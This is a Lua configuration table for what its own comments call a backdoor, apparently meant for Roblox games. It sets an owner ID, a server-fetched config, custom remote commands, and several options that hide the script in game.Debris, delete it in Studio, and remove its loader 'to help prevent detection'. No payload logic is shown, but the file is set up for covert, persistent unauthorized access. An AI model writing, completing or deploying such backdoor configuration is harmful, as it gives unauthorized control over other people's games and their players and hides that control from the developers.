local C = {
		Ownership = {
			2626177908
		},
		ReplaceLocalCWithServerC = false, -- determines if the local static config file will be replaced with the one from the server
		Detecting = { -- Settings determining how the script will 
			HideInStudio= true, -- when false, script will not attempt to hide itself in studio
			DeleteInStudio = true, -- when false, script will destroy itself if the game is in studio
			AvoidHTTPS = false, -- script will only use the local static config file
			HideLocation = game.Debris, -- Location the script will hide itself
			DeleteLoader = true, -- Remove the loader script after backdoor is started, can help prevent detection
		}, 
		Commands = { -- Custom commands not hard coded into the backdoor
			["Test"] = function()
				print("Test Fired")
			end,
		},
	}
